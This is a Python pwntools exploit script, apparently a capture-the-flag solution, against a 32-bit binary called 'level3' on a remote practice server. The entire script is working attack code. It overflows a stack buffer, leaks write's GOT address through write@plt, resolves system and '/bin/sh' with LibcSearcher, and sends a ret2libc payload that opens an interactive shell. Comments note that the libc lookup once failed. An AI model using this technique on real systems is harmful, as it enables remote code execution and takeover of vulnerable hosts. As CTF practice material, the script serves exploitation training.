from pwn import *
from LibcSearcher import *
# 这题开了nx，无法写shellcode到栈上，字符串也没有"/bin/sh"，system plt地址也没给，所以只能write写出write地址然后爆libc

context.os = "linux"
context.arch = "i386"
# context.log_level = "debug"

elf = ELF("./level3")
write_plt = elf.plt["write"]
write_got = elf.got["write"]

p = remote("node4.buuoj.cn", 29879)

vuln_func = 0x804844b

# leak the real address of write()
payload1 = b'a'*(0x88+4) + p32(write_plt) + p32(vuln_func) + p32(1) + p32(write_got) + p32(4)

p.sendlineafter("Input:\n", payload1)

# find the libc according to the address
# write_addr = u32(p.recvuntil("Input:\n", drop=True))
write_addr = u32(p.recv(4))
print(hex(write_addr))
# p.success("got write() address: {}".format(hex(write_addr)))

# ===== failed: No matched libc, please add more libc or try others ===============
libc = LibcSearcher("write", write_addr)

offset = write_addr - libc.dump("write")

sys_addr = libc.dump("system") + offset
binsh_addr = libc.dump("str_bin_sh") + offset
# =================================================================================
# libc = ELF("./libc-2.19.so")
# libc = ELF("/lib/i386-linux-gnu/libc.so.6")
# print("libc write: ", hex(libc.symbols["write"]))
# offset = write_addr - libc.symbols["write"]
# print("offset：", hex(offset))
# sys_addr = libc.symbols["system"] + offset
# binsh_addr = libc.search(b'/bin/sh').__next__() + offset
# print(hex(sys_addr))

# get shell
payload2 = b'a'*(0x88+4) + p32(sys_addr) + b'aaaa' + p32(binsh_addr)
p.sendlineafter("Input:\n", payload2)

p.interactive()